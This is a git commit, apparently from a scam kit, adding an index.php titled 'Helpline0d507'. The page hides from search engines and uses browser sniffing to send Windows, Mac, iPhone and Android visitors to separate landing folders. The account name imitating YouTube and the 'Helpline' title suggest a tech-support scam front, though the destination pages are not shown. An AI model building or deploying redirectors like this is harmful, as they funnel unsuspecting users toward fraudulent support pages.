6f1c60c86819745fc0574c8700530fe1a628dc63
youtubecom <98105541+youtubecom@users.noreply.github.com>
2023-11-28 20:20:18 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,49 @@
+<html xmlns="http:/www.w3.org/1999/xhtml">
+<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="robots" content="noindex,nofollow">
+	<title>Helpline0d507</title>
+
+	<script type="text/javascript">
+	var isChromium = window.chrome,
+    vendorName = window.navigator.vendor,
+    isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
+    isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+	if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
+   	// is Google chrome
+	window.location.href = "./Win08SuDeEr086/index.html";
+	}
+	if(navigator.userAgent.indexOf("Firefox") != -1 )
+    {
+         window.location.href = "./Win08SuDeEr086/index.html";
+    }
+	if(window.navigator.userAgent.indexOf("Edge") != -1 )
+    {
+         window.location.href = "./Win08SuDeEr086/index.html";
+    }
+	if(window.navigator.userAgent.indexOf("Mac") != -1 )
+    {
+         window.location.href = "./Mac08SuDeEr086/index.html";
+    }
+
+		if(window.navigator.userAgent.indexOf("iPhone") != -1 )
+					{
+							 window.location.href = "./iOS08SuDeEr086/index.html";
+					}
+
+
+					if(window.navigator.userAgent.indexOf("Android") != -1 )
+								{
+										 window.location.href = "./And08SuDeEr086/index.html";
+								}
+
+	if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
+    {
+      window.location.href = "./Win08SuDeEr086/index.html";
+    }
+	$SAFARI_URL = "apple";
+</script>
+
+
+</body>
+
+
+</html>
